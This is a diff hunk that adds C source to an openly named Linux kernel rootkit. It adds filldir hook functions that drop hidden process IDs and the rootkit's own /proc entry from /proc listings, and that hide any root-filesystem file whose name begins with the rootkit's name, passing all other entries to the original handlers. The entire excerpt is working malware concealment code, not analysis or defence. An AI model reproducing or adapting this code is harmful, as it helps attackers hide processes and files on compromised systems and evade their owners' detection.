@@ -367,3 +367,52 @@ static ssize_t r00tkit_procfs_read(struct file *fp,
 }
 
 
+
+
+/*
+define rootkit's proc/root filesystms 
+directory entries filler functions
+*/
+
+static int r00tkit_procfs_filldir(void *_buf,
+				  const char *name,
+				  int namelen,
+				  loff_t offset,
+				  u64 ino,
+				  unsigned int d_type)
+{
+
+	struct hidden_pids *hidden_pid;
+
+
+	list_for_each_entry(hidden_pid,&hidden_pids_listhead,pids_list)
+	{
+		if (strcmp(hidden_pid->pidstr,name) == 0)
+			return 0;
+	}
+
+	//hide rootkit's file in proc filesystem
+	if (strcmp(name,R00TKIT_PROCFS_ENTRYNAME) == 0)
+		return 0;
+
+	return org_procfs_filldir(_buf,name,namelen,offset,ino,d_type);
+}
+
+static int r00tkit_rootfs_filldir(void *_buf,
+				  const char *name,
+				  int namelen,
+				  loff_t offset,
+				  u64 ino,
+				  unsigned int d_type)
+{	
+
+	/*
+	hide any file in  the root filesystem, 
+	if first chars of it's name == r00tkit_name
+	*/
+	if (strncmp(name,R00TKIT_NAME,R00TKIT_NAMELEN) == 0)
+		return 0;
+
+	return org_rootfs_filldir(_buf,name,namelen,offset,ino,d_type);
+}
+
